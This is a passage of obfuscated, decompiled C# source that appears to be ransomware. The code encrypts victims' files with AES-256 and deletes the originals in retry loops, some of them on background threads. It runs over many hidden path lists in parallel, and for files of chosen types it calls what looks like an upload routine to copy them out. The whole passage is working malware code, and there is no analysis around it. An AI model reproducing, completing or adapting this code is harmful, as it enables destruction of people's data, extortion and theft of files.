											PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
										}
										else
										{
											PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
										}
									}
									catch (Exception ex2)
									{
										if (iJiZVjbYIelgdjs)
										{
											try
											{
												File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386601) + ex2.Message + UMXNmMotuFVr.getString_0(107395734));
											}
											catch (Exception)
											{
											}
										}
										jlTbuRFtzeuGOi++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!AtuUAtLJmhINGx)
							{
								if (!ldSVapxVzrqD)
								{
									gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386578), QbfcPqWZFoPC);
								}
								else
								{
									gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386578), Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN));
								}
							}
							else
							{
								try
								{
									if (!ldSVapxVzrqD)
									{
										PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
									}
									else
									{
										PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, Convert.FromBase64String(CS_0024_003C_003E8__locals0.NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
									}
								}
								catch (Exception ex2)
								{
									if (iJiZVjbYIelgdjs)
									{
										try
										{
											File.AppendAllText(CJWDXdtMlfSYp, UMXNmMotuFVr.getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + UMXNmMotuFVr.getString_0(107386601) + ex2.Message + UMXNmMotuFVr.getString_0(107395734));
										}
										catch (Exception)
										{
										}
									}
									jlTbuRFtzeuGOi++;
									return;
								}
							}
							if (ldSVapxVzrqD)
							{
								if (CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs != UMXNmMotuFVr.getString_0(107386583))
								{
									PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + CS_0024_003C_003E8__locals0.lnskrEIqNRqxPQs, bytes);
								}
								else
								{
									PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, bytes);
								}
							}
						}
						end_IL_089e:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1055;
			IL_1055:
			CS_0024_003C_003E8__locals0.MRBsiJVrGpV.Remove(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
		});
	}

	private static void siBOcydppb(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (hCeAnCNkuBouGp == getString_0(107396821))
					{
						foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
						{
							if (string_0.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396821))
							{
								if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396620))
							{
								try
								{
									tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386560)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386560), getString_0(107389504)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void PSWanipCZcsCQ(string MVGPkjBoBWG, string LTGXddhSrIErg, byte[] BNPkKMdwDvCDB, byte[] UaVpgXlbpYinFpAQ = null)
	{
		try
		{
			if (hCeAnCNkuBouGp == getString_0(107396821))
			{
				FileStream fileStream = new FileStream(MVGPkjBoBWG, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
				{
					if (MVGPkjBoBWG.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396821))
					{
						if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), MVGPkjBoBWG);
							}
							catch
							{
							}
						}
					}
					else if (MVGPkjBoBWG.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396620))
					{
						try
						{
							tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), MVGPkjBoBWG);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (MVGPkjBoBWG != LTGXddhSrIErg)
		{
			File.Move(MVGPkjBoBWG, LTGXddhSrIErg);
			MVGPkjBoBWG = LTGXddhSrIErg;
		}
		byte[] bytes = xdhcRNHRhIrdsES.rIPxguvEmEeCvU(File.ReadAllBytes(MVGPkjBoBWG), BNPkKMdwDvCDB, UaVpgXlbpYinFpAQ);
		File.WriteAllBytes(MVGPkjBoBWG, bytes);
		AOxElPxfgdJ++;
	}

	private static void gGrpQJiClzFyZ(string string_0, string string_1, byte[] byte_0)
	{
		euHCglGVvrGc CS_0024_003C_003E8__locals0 = new euHCglGVvrGc();
		CS_0024_003C_003E8__locals0.fkWbnCCVseo = string_0;
		CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string dLDgEOWqaSnubBF = CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF;
			FileStream fileStream = new FileStream(dLDgEOWqaSnubBF, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (GUenUfjFQXZm == getString_0(107396821))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.fkWbnCCVseo, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.fkWbnCCVseo, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.fkWbnCCVseo, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF.Length > 0)
				{
					if (hCeAnCNkuBouGp == getString_0(107396821))
					{
						FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.fkWbnCCVseo, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
						{
							if (CS_0024_003C_003E8__locals0.fkWbnCCVseo.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396821))
							{
								if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), CS_0024_003C_003E8__locals0.fkWbnCCVseo);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.fkWbnCCVseo.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == getString_0(107396620))
							{
								try
								{
									tHlEcNRvGaVVN.LwYCJufplFzw(getString_0(107389105), getString_0(107389100), getString_0(107389055), CS_0024_003C_003E8__locals0.fkWbnCCVseo);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.fkWbnCCVseo);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF.EndsWith(getString_0(107386560)))
					{
						File.Move(CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF, CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF.Replace(getString_0(107386560), getString_0(107389504)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF))
							{
								File.Delete(CS_0024_003C_003E8__locals0.DLDgEOWqaSnubBF);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387332) + CS_0024_003C_003E8__locals0.fkWbnCCVseo + getString_0(107386583) + ex2.Message + getString_0(107395716));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> irZYiWnxBrD = IrZYiWnxBrD;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386985)), string_0);
			};
		}
		Parallel.ForEach(irZYiWnxBrD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source = uPUuCQFvbMI;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386972)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		if (wCjobMKomWZ == getString_0(107396821))
		{
			string[] fYNjTuxrmMLYd = FYNjTuxrmMLYd;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386972)), getString_0(107386947) + string_0 + getString_0(107386970));
				};
			}
			Parallel.ForEach(fYNjTuxrmMLYd, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		if (!hhcgraCrPsmCioL().Contains(getString_0(107389018)))
		{
			try
			{
				DjPMEMdbQtZKb(IaFrllmnGTUgy);
			}
			catch (Exception)
			{
			}
			List<string> yCIKPmfZtuIbUFAlB = YCIKPmfZtuIbUFAlB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
				{
					cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
				};
			}
			Parallel.ForEach(yCIKPmfZtuIbUFAlB, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		else
		{
			List<string> yCIKPmfZtuIbUFAlB2 = YCIKPmfZtuIbUFAlB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
				{
					cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
				};
			}
			Parallel.ForEach(yCIKPmfZtuIbUFAlB2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
		}
		List<string> ooMyfWWolleKv = OoMyfWWolleKv;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
			{
				cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386965)), string_0);
			};
		}
		Parallel.ForEach(ooMyfWWolleKv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386985)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386972)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386972)), getString_0(107386947) + string_0 + getString_0(107386970));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386965)), string_0);
	}

	static PhxOPeBqRsG()
	{
		Strings.CreateGetStringDelegate(typeof(PhxOPeBqRsG));
		oWHQHJfsyNioFvF = getString_0(107389013);
		QbfcPqWZFoPC = null;
		nLzLTpABeRNVVq = getString_0(107396620);
		hlKQtNLDuwX = getString_0(107386916);
		RREAXVcGCyFW = new List<string>();
		pJNYtmUhPRnWd = new List<string>();
		GiFkNGgoeUmR = getString_0(107396620);
		NsSmeXJHTmoYqwKN = getString_0(107389504);
		ndmvemzTqn = getString_0(107389504);
		lYLvwKXVot = getString_0(107389504);
		yyUbJQLyaMc = getString_0(107396620);
		OmILzYUZMtfA = 0;
		KBtpeelEiWZuxq = getString_0(107396620);
		FjIjlBoryod = getString_0(107396620);
		ozHrrguPqrKLX = getString_0(107396620);
		gLRyPbhpEhtV = getString_0(107386935);
		ozCbyDrITcAQP = getString_0(107396620);
		YccnjRUGmPaVvYxSUL = getString_0(107396620);
		BWhgdETaJVCX = getString_0(107396620);
		qqiiQuXknD = getString_0(107396620);
		JWJCGvFLzMG = new List<string>
		{
			jPRGqhYdKzNWs(getString_0(107386930)),
			jPRGqhYdKzNWs(getString_0(107386881)),
			jPRGqhYdKzNWs(getString_0(107386856)),
			jPRGqhYdKzNWs(getString_0(107386871)),
			jPRGqhYdKzNWs(getString_0(107386814)),
			jPRGqhYdKzNWs(getString_0(107386789)),
			jPRGqhYdKzNWs(getString_0(107386804)),
			jPRGqhYdKzNWs(getString_0(107386747)),
			jPRGqhYdKzNWs(getString_0(107386210)),
			jPRGqhYdKzNWs(getString_0(107386185)),
			jPRGqhYdKzNWs(getString_0(107386200)),
			jPRGqhYdKzNWs(getString_0(107386143)),
			jPRGqhYdKzNWs(getString_0(107386118))
		};
		tCYvoiODTAqS = new List<string>();
		myDCltnChvy = getString_0(107396620);
		Uxtbyuiilbwc = getString_0(107396620);
		GSgQYhmcripq = getString_0(107396620);
		rIFldVBsKLex = new List<string>();
		NgFxRivWtQo = getString_0(107396620);
		CkoHMbfQgoU = getString_0(107386125);
		xkNXdReJgqdr = getString_0(107396620);
		TdqWNQlRrVSrjYC = getString_0(107396620);
		IrZYiWnxBrD = new List<string>
		{
			jPRGqhYdKzNWs(getString_0(107386044)),
			jPRGqhYdKzNWs(getString_0(107386027)),
			jPRGqhYdKzNWs(getString_0(107386490)),
			jPRGqhYdKzNWs(getString_0(107386409)),
			jPRGqhYdKzNWs(getString_0(107386392)),
			jPRGqhYdKzNWs(getString_0(107386327)),
			jPRGqhYdKzNWs(getString_0(107385706)),
			jPRGqhYdKzNWs(getString_0(107385677))
		};
		uPUuCQFvbMI = new List<string>
		{
			jPRGqhYdKzNWs(getString_0(107385620)),
			jPRGqhYdKzNWs(getString_0(107385587)),
			jPRGqhYdKzNWs(getString_0(107385510)),
			jPRGqhYdKzNWs(getString_0(107385493)),
			jPRGqhYdKzNWs(getString_0(107385972)),
			jPRGqhYdKzNWs(getString_0(107385891)),
			jPRGqhYdKzNWs(getString_0(107385878)),
			jPRGqhYdKzNWs(getString_0(107385845)),
			jPRGqhYdKzNWs(getString_0(107385812)),
			jPRGqhYdKzNWs(getString_0(107385779)),
			jPRGqhYdKzNWs(getString_0(107385746)),
			jPRGqhYdKzNWs(getString_0(107385201)),
			jPRGqhYdKzNWs(getString_0(107385128)),
			jPRGqhYdKzNWs(getString_0(107385087)),
			jPRGqhYdKzNWs(getString_0(107385074)),
			jPRGqhYdKzNWs(getString_0(107385041)),
			jPRGqhYdKzNWs(getString_0(107384968)),
			jPRGqhYdKzNWs(getString_0(107385447)),
			jPRGqhYdKzNWs(getString_0(107385406)),
			jPRGqhYdKzNWs(getString_0(107385397)),
			jPRGqhYdKzNWs(getString_0(107385364)),
			jPRGqhYdKzNWs(getString_0(107385323)),
			jPRGqhYdKzNWs(getString_0(107385258)),
			jPRGqhYdKzNWs(getString_0(107385620)),
			jPRGqhYdKzNWs(getString_0(107385217)),
			jPRGqhYdKzNWs(getString_0(107384696)),
			jPRGqhYdKzNWs(getString_0(107384651)),
			jPRGqhYdKzNWs(getString_0(107384586)),
			jPRGqhYdKzNWs(getString_0(107384545)),
			jPRGqhYdKzNWs(getString_0(107384536)),
			jPRGqhYdKzNWs(getString_0(107384503)),
			jPRGqhYdKzNWs(getString_0(107384462)),
			jPRGqhYdKzNWs(getString_0(107384901)),
			jPRGqhYdKzNWs(getString_0(107385587)),
			jPRGqhYdKzNWs(getString_0(107384860)),
			jPRGqhYdKzNWs(getString_0(107385510)),
			jPRGqhYdKzNWs(getString_0(107384827)),
			jPRGqhYdKzNWs(getString_0(107384826)),
			jPRGqhYdKzNWs(getString_0(107384785)),
			jPRGqhYdKzNWs(getString_0(107384752)),
			jPRGqhYdKzNWs(getString_0(107384167)),
			jPRGqhYdKzNWs(getString_0(107384126)),
			jPRGqhYdKzNWs(getString_0(107384093)),
			jPRGqhYdKzNWs(getString_0(107384060)),
			jPRGqhYdKzNWs(getString_0(107384051)),
			jPRGqhYdKzNWs(getString_0(107383978)),
			jPRGqhYdKzNWs(getString_0(107383937))
		};
		YCIKPmfZtuIbUFAlB = new List<string>
		{
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107384440))),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107384359))),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107384266))),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107383657))),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107383596))),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107383499))),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107383918))),
			jPRGqhYdKzNWs(getString_0(107383821)),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107383728))),
			jPRGqhYdKzNWs(getString_0(107383119)),
			jPRGqhYdKzNWs(getString_0(107383026)),
			jPRGqhYdKzNWs(getString_0(107382929)),
			jPRGqhYdKzNWs(getString_0(107383348)),
			jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107384440)))
		};
		IaFrllmnGTUgy = jPRGqhYdKzNWs(getString_0(107383251));
		OoMyfWWolleKv = new List<string>
		{
			jPRGqhYdKzNWs(getString_0(107382594)),
			jPRGqhYdKzNWs(getString_0(107382400)),
			jPRGqhYdKzNWs(getString_0(107382718)),
			jPRGqhYdKzNWs(getString_0(107382012)),
			jPRGqhYdKzNWs(getString_0(107382362)),
			jPRGqhYdKzNWs(getString_0(107382168))
		};
		bbzLZDIlwi = new List<string>
		{
			jPRGqhYdKzNWs(getString_0(107381462)),
			jPRGqhYdKzNWs(getString_0(107381401)),
			jPRGqhYdKzNWs(getString_0(107381820))
		};
		nCFoyyEfqMoXVXwj = getString_0(107396620);
		JxKfMYSDzyz = getString_0(107396620);
		PysxgjOhENWN = new DateTime(2000, 1, 1);
		iIsBJdTdnKl = new DateTime(2100, 1, 1);
		tRxOjxLQIVi = getString_0(107396821);
		BDeugxVDNkK = getString_0(107386662);
		xNacrcDdcyMpcHAi = getString_0(107396620);
		SAADKWeCESrVxh = getString_0(107396620);
		WXJgWffuwXd = getString_0(107396620);
		vSvPIxrDMp = getString_0(107396821);
		bHHzxslVgWZLK = getString_0(107396620);
		hCeAnCNkuBouGp = getString_0(107396620);
		WMwztsmasQzPlms = new List<string>
		{
			getString_0(107395370),
			getString_0(107395628),
			getString_0(107395436),
			getString_0(107395509)
		};
		NuNXfGMelkyJH = getString_0(107396620);
		xTfHhQvYRPop = getString_0(107381759);
		ZgEiKGRvnhAsc = getString_0(107396620);
		uVMjIBAQKTtmEg = getString_0(107396620);
		DZHocsiPMmkPfZ = getString_0(107396620);
		WocDbkOwDbogol = string.Empty;
		wiOAgZvALBbKd = getString_0(107396620);
		JJEqXdEhsZwI = getString_0(107396821);
		xYpLCAVgyBOj = getString_0(107396821);
		UlVSLsCncbMdhGO = getString_0(107381786);
		uvZdOBpqtfGE = getString_0(107381713);
		YevLoBoZIU = getString_0(107396620);
		rgPcaXsDNBQ = getString_0(107396620);
		eVxuVysgKWK = getString_0(107396620);
		BuOOARqhNph = getString_0(107396620);
		WAuNiYEeWuQE = getString_0(107396620);
		WRIJIYrfMdFFYO = getString_0(107388610);
		pLmfoZoOmDPaZ = getString_0(107396620);
		IgbuSWVjBYK = getString_0(107396620);
		yVwPEJFmibAZK = getString_0(107413263);
		fgVaHjGsjcVVT = getString_0(107396620);
		FjmNRIeDCCCMPGH = getString_0(107396620);
		ezwxvYAfqF = getString_0(107396620);
		OfibXUnjypMZ = getString_0(107396620);
		hvGepLoFGYytPmQoB = getString_0(107413214);
		LMYEaEKRBhrmZ = getString_0(107396821);
		msoqVvcNnNic = getString_0(107396821);
		IHWduAvsEvfi = getString_0(107396620);
		wCjobMKomWZ = getString_0(107396620);
		FYNjTuxrmMLYd = new string[0];
		GUenUfjFQXZm = getString_0(107396821);
		XCsezoZWotlJ = true;
		tlbyuCUJmYbILB = getString_0(107396821);
		ldSVapxVzrqD = true;
		ljOcDCDdQqE = false;
		AmXJmjSSpzM = false;
		UJmSBWsTWhUWfFO = false;
		CJWDXdtMlfSYp = getString_0(107413233);
		iJiZVjbYIelgdjs = false;
		PFYXYEyErhC = false;
		BbIbxCUpjhdp = false;
		AfVRFSOzqdcuiaP = false;
		AtuUAtLJmhINGx = true;
		VLIXjNPLrckApD = getString_0(107413180) + Environment.UserName + getString_0(107413199) + Environment.MachineName + getString_0(107413178) + tHlEcNRvGaVVN.IYTCsYJsmzxE() + getString_0(107413173);
		oGWxQvtPLxTata = true;
		pgcRoGyexW = new Stopwatch();
		jlTbuRFtzeuGOi = 0;
		AOxElPxfgdJ = 0;
		mVHEjGEVbs = false;
		zDWzXsHkfaAHYk = getString_0(107413164) + tHlEcNRvGaVVN.IYTCsYJsmzxE() + getString_0(107413123);
		HTAXVkquFAX = new string[1] { getString_0(107413118) };
		woareyDOrgQIBeNF = new List<string>();
		OJyevihVUiZpn = 0;
		yKfQtEFbRGh = true;
		kYDltoULChd = false;
		zcUPsmvQPTXgnTL = false;
		QgtapIBydwyYG = false;
		SnRSscbMrPPgbx = false;
		IbDKTAofqidR = false;
		CUzJiAbMAitn = new List<string>();
		bfYXiuTlOhZZ = getString_0(107413509);
		WcDXYQEnYXB = true;
	}
}
